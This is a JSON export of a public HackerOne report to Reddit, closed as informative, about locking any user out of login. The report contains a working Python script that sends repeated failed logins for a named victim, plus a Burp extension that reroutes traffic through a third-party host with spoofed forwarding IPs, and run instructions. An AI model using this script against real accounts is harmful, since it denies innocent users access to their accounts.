{
  "id": 1582778,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTgyNzc4",
  "url": "https://hackerone.com/reports/1582778",
  "title": "Misconfigurated login page able to lock login action for any account without user interaction",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "critical",
  "readable_substate": "Informative",
  "created_at": "2022-05-27T10:17:28.834Z",
  "submitted_at": "2022-05-27T10:17:28.931Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ug0x01",
    "url": "/ug0x01",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35710,
    "url": "https://hackerone.com/reddit",
    "handle": "reddit",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/710/c1ae53147a025b33b7c8383200432c8b4a9b839a_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Reddit",
      "twitter_handle": "reddit",
      "website": "https://www.reddit.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-06-06T23:10:51.121Z",
  "bug_reporter_agreed_on_going_public_at": "2022-06-01T14:07:03.125Z",
  "team_member_agreed_on_going_public_at": "2022-06-06T23:10:50.997Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\nWhile observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.\n\n## PoC\n1. Save this code as `exploit.py`:\n\n```\n#!/bin/python3\n\nfrom requests import get, post\nfrom sys import argv\nfrom warnings import filterwarnings\nfrom time import sleep\nfrom concurrent.futures import ThreadPoolExecutor\n\nfilterwarnings(\"ignore\")\n\ndef get_creds():\n    res = get(\"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\")\n    \n    csrf_token = res.text.split('name=\"csrf_token\" value=\"')[1].split('\">')[0]\n    \n    return res.cookies.get_dict(), csrf_token\n\ndef lock_account(account, cookie, csrf_token):\n    post(\"https://www.reddit.com/login\", cookies=cookie, proxies={\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}, data={\"csrf_token\": csrf_token, \"otp\": '', \"password\": \"asdasdasasdasd231321d\", \"dest\": \"https://www.reddit.com\", \"username\": account}, headers={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"https://www.reddit.com\", \"Sec-Fetch-Dest\": \"empty\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Referer\": \"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\", \"Connection\": \"close\"}, verify=False)\n\ncookie, csrf_token = get_creds()\n    \nfor _ in range(14):\n    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n\nprint(\"Account Locked!!\")\n        \nsleep(60)\n    \nwhile True:\n    cookie, csrf_token = get_creds()\n    \n    for _ in range(14):\n        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n        \n    sleep(60)\n```\n2. Save this code as `helper.py`:\n```\nfrom burp import IBurpExtender\nfrom burp import IHttpListener\n\nimport random\nimport socket\nimport struct\n\nHOST_FROM = \"www.reddit.com\"\nHOST_TO = \"ugroon.link\"\n\nclass BurpExtender(IBurpExtender, IHttpListener):\n    def registerExtenderCallbacks(self, callbacks):\n        self._helpers = callbacks.getHelpers()\n        \n        callbacks.setExtensionName(\"Traffic redirector\")\n        callbacks.registerHttpListener(self)\n\n    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):\n        helpers = self._helpers\n        if not messageIsRequest:\n            return\n        httpService = messageInfo.getHttpService()\n\n        if (HOST_FROM == httpService.getHost()):\n            message = helpers.bytesToString(messageInfo.getRequest())\n            message = message.replace(\"Host: \" + HOST_FROM, \"Host: \" + HOST_TO)\n            message_array = message.split(\"\\n\")\n            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))\n            message_array.insert(3, \"X-My-X-Forwarded-For: \" + random_ip)\n            message = \"\\n\".join(message_array)\n            \n            print(message)\n            \n            message = helpers.stringToBytes(message)\n            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))\n\n```\n3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)\n4. Download a burp which is older than 2021 version (new versions giving too many errors)\n5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`\n6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`\n7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step\n8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.\n9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.\n\n##PoC video\n\n{F1746674}\n\n#Suggested Solutions\nTo avoid issues like rate limit, use protections like captcha instead of using such protection\n\n##Notes\n1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can \"never\" login into the victim account (added for avoid misunderstandings)\n2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.\n\nCheers,\n@h1ugroon\n\n## Impact\n\nOnce the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1746674,
      "file_name": "recording-1653645412706.webm",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h11p01gfdkpfho5z7qc53fu0w148?response-content-disposition=attachment%3B%20filename%3D%22recording-1653645412706.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1653645412706.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3I276FVZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBR%2Fcj4He1YNoxuqlCR8y8rqIukyINMyDPuGH4bBYx6SAiEA9rxAEFgc%2FY9ADMxq89WI%2F4YUHMXyjEPxPzJLolchOMcqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDFBjNDAnQ2OT9fFEUCqPBdD%2BXXWBgaRxNEUUo6cEeoytD1eXvhIsF8BkIAolofhhkKHa%2FJ9rh00ejh6T8IepmFmzqyDA1to2vDIum2KthQ0U6K%2Fq21GMCUMZo7xXkyphPeZxTlJE8cbrBa9V7531H4caFbz7tu71hUjruj7poNeDwa5J2XkqEShNg6VTkYFYqW2p508BdQAm0fm%2BJSHq3faBYzcdc%2BIdgG0f6PUjEYh8ysP11Ro09SiXv3N3T6DptjJHKSv7KUv%2FZb54m8zxj0ho7JBJGg0PnntZNlzuUrPyB5o8m6NghY%2FGYTA8AM56YwOqBpjHb6CnraAhdaDe1bVoMVPvNpaoYIcwcd4aA5uVq%2F%2BMEFbgRAsaOaZwmVbJkgiy2He0wZ1y%2Bi038Z1fvfDUbGHaWHIvakM7EmAYLWhUjnVli%2B3NqZponfkOVtoUKkcIkHv%2FMcMGpAcK0LuL5c2PBD0kic3yPmgcNitophPyXa55qvUBwb0m1aYQTwhCX70%2B1MuBBNqQvAsVUygdhbSZflPVFLVYXYCw10pZBosqrbt33MeOhLAD8A8FNaf8XnRxoIDh3nC1b6UKs2zWAsQPsE7gNEmhUsXIocoqXYlZh%2FQZSSdnGUabitNEws3%2FzTErmpCZuC2pr4nC5OCy4AoCpAKYzhiaBnVjXyi1NhUFfB7kXutS3csu0Lk3ScNHi9nlMRK%2FSHZ%2BmmfQUxKvkUG6N76Rrx09p1D%2Brasm6BwCfo%2FSw7hRWxvXSZbCwxc3do9Mpm9IRFA7fgftyitVAMxs%2B8%2FYuoPx7yvUxg0bClyQ192xRI2lA%2B2Re%2FTICR8V2PH0zUKh00J8XQvEL4nx0dQPY1eX5ebqa0OrnmqUj5MM0BpBxhDPhte4fVZA92wwkMCtrgY6sQESsP34nDSGQ6%2FMJpkkUSZiwSB%2F4jJvcrOQGDnz8fYink0yrV9jUVthg%2F0T80d3eDYEK8OVRR2nDjVCUQg3IxtCiugMaPpFUdgVHqXf%2FGpaDapO5M8KW58NB4nk4LoOYgrk9ZTwWMl3jVREWlQWgRKb1D2x8jgp12%2B72xMOnvcfsjT5bTR2OBDEBsh2BamCCdP1z2L0lwJwCGwomgMutcDqcL1aIj%2F%2Fac5TUFnKnI3315E%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64e7453c0f05af80c724de673d282f0bc82f29f57f996ebbfedda320d42a38f2",
      "file_size": 59251341,
      "type": "video/webm",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 15,
  "voters": [
    "0xm5awy",
    "shelled",
    "zy9ard3",
    "renekroka",
    "ug0x01",
    "shivammusic",
    "bollwide",
    "rewiev",
    "leqtuer",
    "pawankushwah",
    "and 5 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 18825,
    "asset_type": "URL",
    "asset_identifier": "www.reddit.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 186834,
      "category": "researcher",
      "content": "A punishment for every mistake, a reward for every kindness",
      "user": {
        "id": 2136612,
        "username": "ug0x01",
        "name": "Noice 🍋",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-12-21T10:09:59.886Z",
        "url": "https://hackerone.com/ug0x01",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
